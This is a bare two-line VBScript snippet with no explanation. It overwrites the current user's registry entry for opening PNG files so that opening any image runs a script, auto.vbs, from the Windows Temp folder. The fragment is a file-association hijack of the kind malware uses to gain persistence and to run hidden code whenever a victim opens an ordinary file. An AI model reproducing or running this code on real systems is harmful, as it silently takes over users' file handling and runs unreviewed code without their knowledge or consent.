Set objShell = CreateObject("WScript.Shell") 
objShell.RegWrite "HKCU\Software\Classes\pngfile\shell\open\command\", "wscript.exe C:\Windows\Temp\auto.vbs", "REG_SZ"
